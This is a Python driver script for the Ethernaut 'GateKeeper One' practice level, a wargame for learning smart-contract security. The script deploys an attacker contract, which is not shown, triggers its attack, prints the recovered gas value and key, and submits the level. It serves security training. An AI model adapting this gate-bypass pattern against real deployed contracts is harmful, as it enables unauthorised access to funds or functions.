from ape import accounts, project
from ..utils.helper import get_level_instance, level_completed

ETHERNAUT = "0xD2e5e0102E55a5234379DD796b8c641cd5996Efd"
LEVEL = "0x2a2497aE349bCA901Fea458370Bd7dDa594D1D69"


def main():
    # setting up user
    user = accounts.test_accounts[0]

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user)

    # deploy hacker contract
    print("\n--- Deploying hacker contract ---\n")
    hacker = project.GateKeeperOne.deploy(instance, sender=user)

    # exploit goes here
    print(
        f"\n--- Instance entrant variable before exploit: {hacker.instanceEntrant()} ---\n"
    )
    print("\n--- Exploiting level instance ---\n")
    tx = hacker.attack(sender=user)
    print(
        f"\n--- Instance entrant variable after exploit: {hacker.instanceEntrant()} ---\n"
    )

    print(
        f"\n--- The gas required to pass this level: {int(tx.logs[0]['topics'][1].hex(), 0)} ---\n"
    )
    print(f"\n--- The key for this level: {tx.logs[0]['topics'][2].hex()[:18]} ---\n")

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
